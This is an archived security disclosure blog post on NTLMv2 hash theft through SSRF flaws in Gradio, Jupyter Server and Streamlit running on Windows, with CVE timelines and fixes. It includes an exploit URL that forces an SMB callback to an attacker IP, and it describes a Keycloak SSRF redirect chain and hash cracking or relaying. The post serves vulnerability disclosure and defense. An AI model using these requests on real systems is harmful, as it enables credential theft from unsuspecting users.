---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-08-23_ntlm-credential-theft-in-python-windows-applications.md
original_filename: 2024-08-23_ntlm-credential-theft-in-python-windows-applications.md
title: NTLM Credential Theft in Python Windows Applications
category: documents
detected_topics:
- ssrf
- command-injection
- api-security
- supply-chain
- sso
- path-traversal
tags:
- imported
- documents
- ssrf
- command-injection
- api-security
- supply-chain
- sso
- path-traversal
language: en
raw_sha256: 0a514d8ec9147cd926c9ab7fbfefe504bffd41d8147374953608b76805551e54
text_sha256: 53399c5b5af35c4724d359c1740ae4b30dd0688e95620667c6c6385fd5673330
ingested_at: '2026-06-28T07:32:37Z'
sensitivity: unknown
redactions_applied: false
---

# NTLM Credential Theft in Python Windows Applications

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-08-23_ntlm-credential-theft-in-python-windows-applications.md
- Source Type: markdown
- Detected Topics: ssrf, command-injection, api-security, supply-chain, sso, path-traversal
- Ingested At: 2026-06-28T07:32:37Z
- Redactions Applied: False
- Raw SHA256: `0a514d8ec9147cd926c9ab7fbfefe504bffd41d8147374953608b76805551e54`
- Text SHA256: `53399c5b5af35c4724d359c1740ae4b30dd0688e95620667c6c6385fd5673330`


## Content

---
title: "NTLM Credential Theft in Python Windows Applications"
url: "https://www.horizon3.ai/attack-research/disclosures/ntlm-credential-theft-in-python-windows-applications/"
authors: ["Naveen Sunkavally"]
programs: ["Python", "Hugging Face (Gradio)", "Werkzeug", "Jupyter", "Snowflake (Streamlit)"]
bugs: ["SSRF", "NTLMv2 hash disclosure", "NTLM", "Security code review"]
publication_date: "2024-08-23"
added_date: "2024-08-26"
source: "pentester.land/writeups.json"
original_index: 50
scraped_via: "browseros"
---

# NTLM Credential Theft in Python Windows Applications

NTLM Credential Theft in Python Windows Applications
Naveen Sunkavally
August 23, 2024
Attack Blogs, Disclosures

NTLMv2 hash theft is a well known credential harvesting technique made possible by the insistence of Windows to automatically authenticate to anything it possibly can. It’s a staple technique used in internal pentests with tools such as responder or ntlmrelayx, exploiting issues such as legacy LLMNR/NBT-NS protocols being enabled or forced authentication vulnerabilities like PetitPotam. It has also been exploited over the Internet, typically by abusing Microsoft Outlook, as described in recent cases by Proofpoint and Microsoft.

When auditing web applications, NTLMv2 hash theft is possible on Windows hosts through the exploitation of Server-Side Request Forgery (SSRF) or XML External Entities (XXE) vulnerabilities. Much has been written on the topic, and new vulnerabilities continue to be found. In this post, we’re disclosing new SSRF vulnerabilities leading to NTLMv2 hash disclosure in three of the most popular Python frameworks out there: Gradio by Hugging Face, which powers several popular AI tools; Jupyter Server, which underpins Jupyter Notebook and JupyterLab; and Streamlit from Snowflake.

The vulnerabilities disclosed here relate to how these Python frameworks retrieve files. Specifically, in Python, any file system operation performed on insufficiently validated input can lead to the leakage of NTLMv2 hashes. The vulnerabilities disclosed here can be exploited by unauthenticated attackers, and they have come up in real-world pentests conducted by NodeZero. Along the way we’ll also cover an interesting Python bug affecting older versions of Python on Windows that could assist in NTLMv2 hash theft.

CVE-2024-34510: NTLMv2 Hash Disclosure in Gradio

Gradio is a popular open-source Python web application framework for developing and sharing AI/ML demos. Last December we disclosed two path traversal vulnerabilities, CVE-2023-51449 and CVE-2024-1561, affecting Gradio, and we wrote about our subsequent work with Hugging Face to secure their Spaces environment. At the time we disclosed these vulnerabilities, we also disclosed a couple of NTLMv2 hash disclosure issues, which are covered by CVE-2024-34510.

NTLMv2 Hash Disclosure in the file Endpoint

The Gradio file API endpoint accepts a path for downloading a file within a restricted set of directories on the local file system. By default, this endpoint is accessible to unauthenticated users. In vulnerable versions of Gradio, the Path.is_dir() method is called on this path prior to fully validating it.

https://github.com/gradio-app/gradio/blob/gradio%404.4.0/gradio/routes.py#L447

If Gradio is running on Windows, and the user-provided path is a UNC path, Gradio will attempt to connect to the SMB server at the path. An attacker can abuse this by using tools like responder to set up a fake SMB server and capture or relay the NTLMv2 hash of the Windows user running Gradio. In this example Gradio is running on 10.0.220.53 and the attacker IP where responder is running is 10.0.225.200.

NTLMv2 Hash Disclosure in Gradio’s Static File Handlers

What if Gradio was set up to require authentication? A lot of Gradio endpoints on the Internet have auth enabled. We found another vector to leak NTLMv2 hashes in Gradio’s static file handlers, assuming the version of Python installed on the host is less than 3.11.2. A GET request to a URL of the form http://10.0.220.53:7860/static///10.0.225.200/share will trigger an SMB callback from the Gradio server at 10.0.220.53 to the attacker IP 10.0.225.200.

The underlying issue can be traced back to Python’s implementation of os.path.isabs on Windows. When retrieving static files, Gradio performs a safe_join to load files from within a trusted directory.

https://github.com/gradio-app/gradio/blob/gradio%404.4.0/gradio/routes.py#L836

At line 834, Gradio checks several conditions before performing the file system operation os.path.isdir at line 839. It turns out that in Python versions before 3.11.2, os.path.isabs doesn’t report partial UNC paths of the form //10.0.225.200/share as absolute file paths. Note the syntax – this partial UNC path has to be constructed with forward slashes and should not have a trailing slash or any other trailing path elements. At the same time, when performing an os.path.join, Python treats this as partial UNC path as an absolute path! This inconsistency between os.path.isabs and os.path.join is a bug. This results in a scenario where all conditions are satisfied and os.path.isdir is executed, leading to NTLMv2 hash disclosure. (If you’re interested in diving deeper, check out the changes to the Python ntpath module in GitHub.)

Python 3.10.6 vs. Python 3.11.2

This scenario may seem like quite an edge case but note that the most popular usage of Gradio is the Stable Diffusion Web UI, which requires per its installation instructions Python 3.10.6 when run on Windows. This application has over 138K stars and is among the top 50 GitHub starred repos.

Werkzeug safe_join Also Vulnerable

Gradio borrowed its safe_join from the popular Werkzeug library, and the safe_join in Werkzeug’s library is also not safe under this condition – Python version < 3.11.2 on Windows.

https://github.com/pallets/werkzeug/blob/main/src/werkzeug/security.py#L131

Werkzeug’s safe_join is used as part of the popular Flask web framework to serve static files. Fortunately in the default configuration of Werzkeug, multiple consecutive forward slashes can’t be passed through as path parameters. However, an app running on Windows that accepts a path as a query parameter or from the request body would be vulnerable, e.g. something like this:

(Gradio uses uvicorn as its web server, which does not merge slashes and allows partial UNC paths to be passed through as path parameters.)

Timeline

We notified both the Python security team and Werkzeug team of the issues related to os.path.isabs and safe_join. While they acknowledged the issues, they did not see a reason for further follow up. Version 4.20 of Gradio fully fixes both NTLMv2 hash disclosure issues.

Dec. 14, 2023: Notified Python security team over email
Dec. 14, 2023: Acknowledgement from Python security team
Dec. 17, 2023: Initial report to Hugging Face over email
Dec. 18, 2023: Hugging Face acknowledges issue
Dec. 18, 2023: Notified Werkzeug via GitHub security issue
Dec. 19, 2023: Werkzeug acnowledges issue
Mar. 5, 2024: Hugging Face releases Gradio version 4.20 with fixes
May 5, 2024: CVE-2024-34510 published
CVE-2024-35178: NTLMv2 Hash Disclosure in Jupyter Server

We had a hunch that other Python apps could be vulnerable to NTLMv2 hash disclosure and decided to take a look at perhaps the most popular Python application out there – Jupyter Notebook.

The Jupyter Notebook application is hosted by Jupyter Server, which in turn uses the Tornado web server. To serve static files, Jupyter Server implements a custom static file handler FileFindHandler that extends Tornado’s built in StaticFileHandler. When serving a file, Jupyter Server runs the function filefind to determine the absolute path of the input file.

https://github.com/jupyter-server/jupyter_server/blob/3fbf07e57c33b6c536edec730601678fbab45188/jupyter_server/utils.py#L341

The file system call to os.path.isfile happens before verifying that the user-provided path is within a restricted directory. This means that, if Jupyter Notebook is running on Windows, an attacker can leak the NTLMv2 hash of the Windows user running Jupyter Notebook by providing a UNC path. In the example below, Jupyter Notebook is running on 10.0.220.6, and an attacker is running responder on 10.0.225.200:

We’ve verified this vulnerability also affects the classic version of Jupyter Notebook and JupyterLab.

Timeline

The vulnerability, CVE-2024-35178, affects the jupyter_server package and is fixed in package version 2.14.1.

May 15, 2024: Raised GitHub security issue against the jupyter_server project
May 15, 2024: Project Jupyter team acknowledges the issue
June 6, 2024: CVE-2024-35178 published with a GitHub security advisory
CVE-2024-42474: NTLMv2 Hash Disclosure in Streamlit

Next we took a look at Streamlit, a popular Python framework developed by Snowflake for creating data science/machine learning demos. Like Jupyter Server, Streamlit also uses the Tornado web server and overrides Tornado’s StaticFileHandler with its own custom static file handler. We found that when static file sharing is enabled (not the default) and Streamlit is running on Windows, an attacker could exploit Streamlit to leak the NTLMv2 hash of the Windows user running Streamlit.

The vulnerable code is in the AppStaticFileHandler.validate_absolute_path function:

https://github.com/streamlit/streamlit/blob/6fd61726188f87b326ab75a8e6305c0827456fa3/lib/streamlit/web/server/app_static_file_handler.py

The call to os.path.isdir on line 45 happens before the check on line 49 to ensure the user provided path is within the expected static folder.

Timeline

Snowflake fixed the vulnerability, CVE-2024-42474, in Streamlit version 1.37.0.

The CVSS vector in Snowflake’s security advisory indicates that low privileges are required to exploit this vulnerability. This assessment is not accurate – this vulnerability can be exploited by unauthenticated attackers.

May 12, 2024: Disclosed vulnerability to Snowflake via HackerOne.
May 14, 2024: HackerOne validates issue
Jun 6, 2024: Snowflake validates issue
July 25, 2024: Snowflake publishes version 1.37.0 with the fix
August 12, 2024: CVE-2024-42474 published with a GitHub security advisory
Exploitation of NTLM Credential Theft

There are two well known ways to exploit NTLMv2 hash disclosure:

Cracking the hash to reveal the plaintext password of the user running the vulnerable service.
Relaying the hash to another network accessible target. Depending on the privileges of the victim user and configuration of the target, it’s possible to get remote code execution on the target host.

In a lot of cases of NTLMv2 hash disclosure, the vulnerable web app runs as LocalSystem and the captured hash is that of a computer account. These accounts have long random passwords and are not feasible to crack. The vulnerabilities disclosed here are more dangerous because the vulnerable applications are typically run by end users who tend to have crackable passwords. Once cracked, an attacker can then attempt to use these credentials to login to any services the victim user may have access to.

Exploitation from the Perimeter

Tools like responder are often associated with internal pentests, but the vulnerabilities disclosed here can be exploited from the Internet, assuming the victim network has not been locked down to prevent outbound SMB traffic.

In this example, a vulnerable version of Gradio running on Windows is exposed to the Internet using Gradio’s “share” feature. These share URLs are posted occasionally to social media when users want to share their demos with the world. An attacker can exploit the exposed instance of Gradio to capture the NTLMv2 hash of the user running Gradio.

Indirect Exploitation from the Perimeter

Even if the vulnerable application is not directly exposed to the Internet, it’s possible to exploit it indirectly through SSRF or XXE vulnerabilities affecting other perimeter assets. This is possible because the vulnerabilities disclosed in this post are all exploitable with simple GET requests.

In this example, a Keycloak server at 54.83.90.245 is vulnerable to a blind SSRF, CVE-2020-10770, and is exposed to the Internet. We exploit the blind SSRF by having Keycloak connect back to an attacker-controlled HTTP server at 98.80.128.226.

The attacker-controlled HTTP server then issues a 302 redirect targeting an instance of a vulnerable Jupyter Notebook running on Windows at an internal IP 10.0.229.6. Note that the redirect URL encodes the double slashes to bypass Keycloak’s behavior of merging slashes.

The Keycloak server follows the redirect and sends a request to the Jupyter Notebook instance. The Jupyter Notebook instance connects back out over SMB to the attacker’s server running responder, leaking the NTLMv2 hash of the user running Jupyter Notebook.

Blind SSRF vulnerabilities are common and typically considered to be of moderate severity, but it’s possible to elevate their impact by chaining it to one of the vulnerabilities disclosed here.

Fix Actions

For defenders, we recommend the following actions:

If you’re running any of the vulnerable applications in this post on Windows, update to the latest version: 4.20+ of Gradio, 2.14.1+ of Jupyter Server, and 1.37.0+ of Streamlit
Configure your host/network firewalls to block SMB traffic going out to the Internet. This is just good policy to prevent exploitation of forced Windows authentication vulnerabilities in general, such as the Outlook Elevation of Privilege vulnerability CVE-2023-23397 that is on CISA’s list of Known Exploited Vulnerabilities.
For the security conscious, if you have users running Python on Windows, update to the latest version of Python so you don’t have to think about the bug in os.path.isabs affecting Python versions < 3.11.2.
Conclusion

Windows is the predominant operating system in enterprises, and Python is the language of choice for AI. With AI making a big splash into the mainstream over the last few years, we’re seeing increased usage of Python applications on Windows. This comes with new risk because traditionally Python apps have been developed and run on Linux-based systems, where the security risks are different than on Windows. We believe the specific issue of NTLMv2 hash theft in Python apps is likely heavily under-reported, and something that all parties –defenders, developers, appsec practitioners, bug bounty hunters, etc — should be on the lookout for.

Get a demo and quickly verify you’re not exploitable.

Get Your Demo

How can NodeZero help you?
Let our experts walk you through a demonstration of NodeZero®, so you can see how to put it to work for your organization.
Get a Demo
Share:
